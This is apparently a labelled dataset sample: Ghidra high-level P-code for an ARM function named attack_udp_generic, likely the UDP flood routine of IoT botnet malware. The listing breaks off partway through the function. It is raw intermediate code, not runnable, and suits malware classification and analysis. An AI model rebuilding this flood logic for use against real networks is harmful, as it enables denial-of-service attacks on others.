Label: 857
Function: attack_udp_generic
Architecture: arm
Source File: Unknown
Entry Point: 00018938

High-level P-code:

(register, 0x2c, 4) INT_ZEXT (register, 0x20, 1)
(unique, 0x1000021e, 4) CALL (ram, 0x26a60, 8) , (register, 0x2c, 4) , (const, 0x4, 4)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x3d, 4)
(register, 0x2c, 4) CAST (unique, 0x10000256, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x100001a1, 4) PTRADD (register, 0x24, 4) , (stack, 0xffffffffffffffb8, 4) , (const, 0x18, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x100001a1, 4) , (const, 0x14, 4)
(unique, 0x1f00, 1) INT_LESS (unique, 0x43980, 1) , (const, 0x20, 1)
 ---  CBRANCH (ram, 0x18d9c, 1) , (unique, 0x1f00, 1)
(unique, 0x1000021a, 4) COPY (unique, 0x1000025a, 4)
(unique, 0x1000025a, 4) CAST (register, 0x2c, 4)
(register, 0x2c, 4) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x100001ad, 4) PTRADD (register, 0x24, 4) , (stack, 0xffffffffffffffb8, 4) , (const, 0x18, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x100001ad, 4) , (const, 0x10, 4)
(register, 0x20, 4) CALL (ram, 0x2bbe0, 8) , (register, 0x2c, 4)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x2ff, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x2ff, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x2ff, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x2ff, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x2ff, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x2ff, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x2ff, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (register, 0x2c, 4) , (const, 0x2ff, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (register, 0x2c, 4) , (const, 0x2ff, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (register, 0x2c, 4) , (const, 0x2ff, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (unique, 0x1000021a, 4) , (const, 0x2ff, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x2ff, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x2ff, 4)
(stack, 0xffffffffffffffdd, 1) INDIRECT (stack, 0xffffffffffffffdd, 1) , (const, 0x2ff, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (stack, 0xffffffffffffffde, 2) , (const, 0x2ff, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x2ff, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x2ff, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x2ff, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x2ff, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x2ff, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x2ff, 4)
(stack, 0xffffffffffffffee, 2) INDIRECT (stack, 0xffffffffffffffee, 2) , (const, 0x2ff, 4)
(register, 0x20, 4) CALL (ram, 0x1cb48, 8)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x302, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x302, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x302, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x302, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x302, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x302, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x302, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x302, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x302, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x302, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x302, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x302, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x302, 4)
(stack, 0xffffffffffffffdd, 1) INDIRECT (stack, 0xffffffffffffffdd, 1) , (const, 0x302, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (stack, 0xffffffffffffffde, 2) , (const, 0x302, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x302, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x302, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x302, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x302, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x302, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x302, 4)
(stack, 0xffffffffffffffee, 2) INDIRECT (stack, 0xffffffffffffffee, 2) , (const, 0x302, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x100001b9, 4) PTRADD (register, 0x24, 4) , (stack, 0xffffffffffffffb8, 4) , (const, 0x18, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x100001b9, 4) , (const, 0x14, 4)
(unique, 0x5780, 4) INT_RIGHT (register, 0x20, 4) , (unique, 0x43980, 1)
(register, 0x2c, 4) INT_ADD (register, 0x20, 4) , (unique, 0x5780, 4)
(register, 0x20, 4) CALL (ram, 0x2bbe0, 8) , (register, 0x2c, 4)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x346, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x346, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x346, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x346, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x346, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x346, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x346, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x346, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x346, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x346, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x346, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x346, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x346, 4)
(stack, 0xffffffffffffffdd, 1) INDIRECT (stack, 0xffffffffffffffdd, 1) , (const, 0x346, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (stack, 0xffffffffffffffde, 2) , (const, 0x346, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x346, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x346, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x346, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x346, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x346, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x346, 4)
(stack, 0xffffffffffffffee, 2) INDIRECT (stack, 0xffffffffffffffee, 2) , (const, 0x346, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (register, 0x20, 4)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x34b, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x34b, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x34b, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x34b, 4)
(unique, 0x100001c1, 4) PTRSUB (stack, 0xffffffffffffffcc, 4) , (const, 0xc, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x1000025e, 4) , (const, 0x4, 4)
(unique, 0x1000025e, 4) PTRSUB (unique, 0x100001c1, 4) , (const, 0x0, 4)
(ram, 0x18f54, 4) MULTIEQUAL (ram, 0x18f54, 4) , (ram, 0x18f54, 4)
(ram, 0x18f58, 4) MULTIEQUAL (ram, 0x18f58, 4) , (ram, 0x18f58, 4)
(ram, 0x18f5c, 4) MULTIEQUAL (ram, 0x18f5c, 4) , (ram, 0x18f5c, 4)
(ram, 0x18f60, 4) MULTIEQUAL (ram, 0x18f60, 4) , (ram, 0x18f60, 4)
(stack, 0xffffffffffffffb8, 4) MULTIEQUAL (stack, 0xffffffffffffffb8, 4) , (stack, 0xffffffffffffffb8, 4)
(stack, 0xffffffffffffffbc, 4) MULTIEQUAL (stack, 0xffffffffffffffbc, 4) , (stack, 0xffffffffffffffbc, 4)
(stack, 0xffffffffffffffc0, 4) MULTIEQUAL (stack, 0xffffffffffffffc0, 4) , (stack, 0xffffffffffffffc0, 4)
(stack, 0xffffffffffffffc4, 4) MULTIEQUAL (register, 0x2c, 4) , (stack, 0xffffffffffffffc4, 4)
(stack, 0xffffffffffffffc8, 4) MULTIEQUAL (register, 0x2c, 4) , (stack, 0xffffffffffffffc8, 4)
(stack, 0xffffffffffffffcc, 4) MULTIEQUAL (register, 0x2c, 4) , (stack, 0xffffffffffffffcc, 4)
(stack, 0xffffffffffffffd0, 4) MULTIEQUAL (unique, 0x1000021a, 4) , (stack, 0xffffffffffffffd0, 4)
(stack, 0xffffffffffffffd4, 4) MULTIEQUAL (stack, 0xffffffffffffffd4, 4) , (stack, 0xffffffffffffffd4, 4)
(stack, 0xffffffffffffffd8, 4) MULTIEQUAL (stack, 0xffffffffffffffd8, 4) , (stack, 0xffffffffffffffd8, 4)
(stack, 0xffffffffffffffdd, 1) MULTIEQUAL (stack, 0xffffffffffffffdd, 1) , (stack, 0xffffffffffffffdd, 1)
(stack, 0xffffffffffffffde, 2) MULTIEQUAL (stack, 0xffffffffffffffde, 2) , (stack, 0xffffffffffffffde, 2)
(stack, 0xffffffffffffffe0, 2) MULTIEQUAL (stack, 0xffffffffffffffe0, 2) , (stack, 0xffffffffffffffe0, 2)
(stack, 0xffffffffffffffe2, 1) MULTIEQUAL (stack, 0xffffffffffffffe2, 1) , (stack, 0xffffffffffffffe2, 1)
(stack, 0xffffffffffffffe3, 1) MULTIEQUAL (stack, 0xffffffffffffffe3, 1) , (stack, 0xffffffffffffffe3, 1)
(stack, 0xffffffffffffffe4, 2) MULTIEQUAL (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe4, 2)
(stack, 0xffffffffffffffe7, 1) MULTIEQUAL (stack, 0xffffffffffffffe7, 1) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe8, 4) MULTIEQUAL (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffffe8, 4)
(stack, 0xffffffffffffffee, 2) MULTIEQUAL (stack, 0xffffffffffffffee, 2) , (stack, 0xffffffffffffffee, 2)
(register, 0x65, 1) INT_EQUAL (stack, 0xffffffffffffffd8, 4) , (const, 0xffffffff, 4)
 ---  CBRANCH (ram, 0x18db8, 1) , (register, 0x65, 1)
(register, 0x20, 4) CALL (ram, 0x1cb48, 8)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x361, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x361, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x361, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x361, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x361, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x361, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x361, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x361, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x361, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x361, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x361, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x361, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x361, 4)
(stack, 0xffffffffffffffdd, 1) INDIRECT (stack, 0xffffffffffffffdd, 1) , (const, 0x361, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (stack, 0xffffffffffffffde, 2) , (const, 0x361, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x361, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x361, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x361, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x361, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x361, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x361, 4)
(stack, 0xffffffffffffffee, 2) INDIRECT (stack, 0xffffffffffffffee, 2) , (const, 0x361, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x100001cd, 4) , (register, 0x20, 4)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x366, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x366, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x366, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x366, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffcc, 4) , (const, 0xc, 4)
(unique, 0x100001cd, 4) PTRSUB (unique, 0x10000262, 4) , (const, 0x0, 4)
(unique, 0x10000262, 4) PTRSUB (unique, 0x8280, 4) , (const, 0x0, 4)
(register, 0x2c, 4) INT_ZEXT (stack, 0xffffffffffffffe4, 2)
(ram, 0x18f54, 4) MULTIEQUAL (ram, 0x18f54, 4) , (ram, 0x18f54, 4)
(ram, 0x18f58, 4) MULTIEQUAL (ram, 0x18f58, 4) , (ram, 0x18f58, 4)
(ram, 0x18f5c, 4) MULTIEQUAL (ram, 0x18f5c, 4) , (ram, 0x18f5c, 4)
(ram, 0x18f60, 4) MULTIEQUAL (ram, 0x18f60, 4) , (ram, 0x18f60, 4)
(stack, 0xffffffffffffffb8, 4) MULTIEQUAL (stack, 0xffffffffffffffb8, 4) , (stack, 0xffffffffffffffb8, 4)
(stack, 0xffffffffffffffbc, 4) MULTIEQUAL (stack, 0xffffffffffffffbc, 4) , (stack, 0xffffffffffffffbc, 4)
(stack, 0xffffffffffffffc0, 4) MULTIEQUAL (stack, 0xffffffffffffffc0, 4) , (stack, 0xffffffffffffffc0, 4)
(stack, 0xffffffffffffffc4, 4) MULTIEQUAL (stack, 0xffffffffffffffc4, 4) , (stack, 0xffffffffffffffc4, 4)
(stack, 0xffffffffffffffc8, 4) MULTIEQUAL (stack, 0xffffffffffffffc8, 4) , (stack, 0xffffffffffffffc8, 4)
(stack, 0xffffffffffffffcc, 4) MULTIEQUAL (stack, 0xffffffffffffffcc, 4) , (stack, 0xffffffffffffffcc, 4)
(stack, 0xffffffffffffffd0, 4) MULTIEQUAL (stack, 0xffffffffffffffd0, 4) , (stack, 0xffffffffffffffd0, 4)
(stack, 0xffffffffffffffd4, 4) MULTIEQUAL (stack, 0xffffffffffffffd4, 4) , (stack, 0xffffffffffffffd4, 4)
(stack, 0xffffffffffffffd8, 4) MULTIEQUAL (stack, 0xffffffffffffffd8, 4) , (stack, 0xffffffffffffffd8, 4)
(stack, 0xffffffffffffffdd, 1) MULTIEQUAL (stack, 0xffffffffffffffdd, 1) , (stack, 0xffffffffffffffdd, 1)
(stack, 0xffffffffffffffde, 2) MULTIEQUAL (stack, 0xffffffffffffffde, 2) , (stack, 0xffffffffffffffde, 2)
(stack, 0xffffffffffffffe0, 2) MULTIEQUAL (stack, 0xffffffffffffffe0, 2) , (stack, 0xffffffffffffffe0, 2)
(stack, 0xffffffffffffffe2, 1) MULTIEQUAL (stack, 0xffffffffffffffe2, 1) , (stack, 0xffffffffffffffe2, 1)
(stack, 0xffffffffffffffe3, 1) MULTIEQUAL (stack, 0xffffffffffffffe3, 1) , (stack, 0xffffffffffffffe3, 1)
(stack, 0xffffffffffffffe4, 2) MULTIEQUAL (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe4, 2)
(stack, 0xffffffffffffffe7, 1) MULTIEQUAL (stack, 0xffffffffffffffe7, 1) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe8, 4) MULTIEQUAL (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffffe8, 4)
(stack, 0xffffffffffffffee, 2) MULTIEQUAL (stack, 0xffffffffffffffee, 2) , (stack, 0xffffffffffffffee, 2)
(register, 0x65, 1) INT_EQUAL (register, 0x2c, 4) , (ram, 0x18f54, 4)
 ---  CBRANCH (ram, 0x18de0, 1) , (register, 0x65, 1)
(register, 0x20, 4) CALL (ram, 0x1cb48, 8)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x378, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x378, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x378, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x378, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x378, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x378, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x378, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x378, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x378, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x378, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x378, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x378, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x378, 4)
(stack, 0xffffffffffffffdd, 1) INDIRECT (stack, 0xffffffffffffffdd, 1) , (const, 0x378, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (stack, 0xffffffffffffffde, 2) , (const, 0x378, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x378, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x378, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x378, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x378, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x378, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x378, 4)
(stack, 0xffffffffffffffee, 2) INDIRECT (stack, 0xffffffffffffffee, 2) , (const, 0x378, 4)
(unique, 0x70f00, 2) SUBPIECE (register, 0x20, 4) , (const, 0x0, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (unique, 0x70f00, 2)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x392, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x392, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x392, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x392, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffcc, 4) , (const, 0x4, 4)
(register, 0x2c, 4) INT_ZEXT (stack, 0xffffffffffffffe0, 2)
(ram, 0x18f54, 4) MULTIEQUAL (ram, 0x18f54, 4) , (ram, 0x18f54, 4)
(ram, 0x18f58, 4) MULTIEQUAL (ram, 0x18f58, 4) , (ram, 0x18f58, 4)
(ram, 0x18f5c, 4) MULTIEQUAL (ram, 0x18f5c, 4) , (ram, 0x18f5c, 4)
(ram, 0x18f60, 4) MULTIEQUAL (ram, 0x18f60, 4) , (ram, 0x18f60, 4)
(stack, 0xffffffffffffffb8, 4) MULTIEQUAL (stack, 0xffffffffffffffb8, 4) , (stack, 0xffffffffffffffb8, 4)
(stack, 0xffffffffffffffbc, 4) MULTIEQUAL (stack, 0xffffffffffffffbc, 4) , (stack, 0xffffffffffffffbc, 4)
(stack, 0xffffffffffffffc0, 4) MULTIEQUAL (stack, 0xffffffffffffffc0, 4) , (stack, 0xffffffffffffffc0, 4)
(stack, 0xffffffffffffffc4, 4) MULTIEQUAL (stack, 0xffffffffffffffc4, 4) , (stack, 0xffffffffffffffc4, 4)
(stack, 0xffffffffffffffc8, 4) MULTIEQUAL (stack, 0xffffffffffffffc8, 4) , (stack, 0xffffffffffffffc8, 4)
(stack, 0xffffffffffffffcc, 4) MULTIEQUAL (stack, 0xffffffffffffffcc, 4) , (stack, 0xffffffffffffffcc, 4)
(stack, 0xffffffffffffffd0, 4) MULTIEQUAL (stack, 0xffffffffffffffd0, 4) , (stack, 0xffffffffffffffd0, 4)
(stack, 0xffffffffffffffd4, 4) MULTIEQUAL (stack, 0xffffffffffffffd4, 4) , (stack, 0xffffffffffffffd4, 4)
(stack, 0xffffffffffffffd8, 4) MULTIEQUAL (stack, 0xffffffffffffffd8, 4) , (stack, 0xffffffffffffffd8, 4)
(stack, 0xffffffffffffffdd, 1) MULTIEQUAL (stack, 0xffffffffffffffdd, 1) , (stack, 0xffffffffffffffdd, 1)
(stack, 0xffffffffffffffde, 2) MULTIEQUAL (stack, 0xffffffffffffffde, 2) , (stack, 0xffffffffffffffde, 2)
(stack, 0xffffffffffffffe0, 2) MULTIEQUAL (stack, 0xffffffffffffffe0, 2) , (stack, 0xffffffffffffffe0, 2)
(stack, 0xffffffffffffffe2, 1) MULTIEQUAL (stack, 0xffffffffffffffe2, 1) , (stack, 0xffffffffffffffe2, 1)
(stack, 0xffffffffffffffe3, 1) MULTIEQUAL (stack, 0xffffffffffffffe3, 1) , (stack, 0xffffffffffffffe3, 1)
(stack, 0xffffffffffffffe4, 2) MULTIEQUAL (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe4, 2)
(stack, 0xffffffffffffffe7, 1) MULTIEQUAL (stack, 0xffffffffffffffe7, 1) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe8, 4) MULTIEQUAL (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffffe8, 4)
(stack, 0xffffffffffffffee, 2) MULTIEQUAL (stack, 0xffffffffffffffee, 2) , (stack, 0xffffffffffffffee, 2)
(register, 0x65, 1) INT_EQUAL (register, 0x2c, 4) , (ram, 0x18f54, 4)
 ---  CBRANCH (ram, 0x18e08, 1) , (register, 0x65, 1)
(register, 0x20, 4) CALL (ram, 0x1cb48, 8)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x3a4, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x3a4, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x3a4, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x3a4, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x3a4, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x3a4, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x3a4, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x3a4, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x3a4, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x3a4, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x3a4, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x3a4, 4)
